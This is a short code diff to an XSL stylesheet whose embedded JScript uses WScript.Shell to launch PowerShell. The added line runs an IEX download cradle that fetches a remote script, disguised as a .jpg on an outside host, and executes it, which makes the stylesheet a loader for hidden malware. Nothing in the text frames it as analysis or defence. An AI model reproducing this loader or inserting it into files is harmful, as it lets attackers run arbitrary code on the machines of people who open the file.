@@ -8,6 +8,6 @@ version="1.0">
 	<![CDATA[
 	var r = new ActiveXObject("WScript.Shell");
 	var taslim = "nako amoo";
-	r.Run("powershell");
+	r.Run("powershell IEX(New-Object Net.WebClient).DownloadString('http://8upload.ir/uploads/f7026778.jpg')");
 	]]> </ms:script>
 </stylesheet>
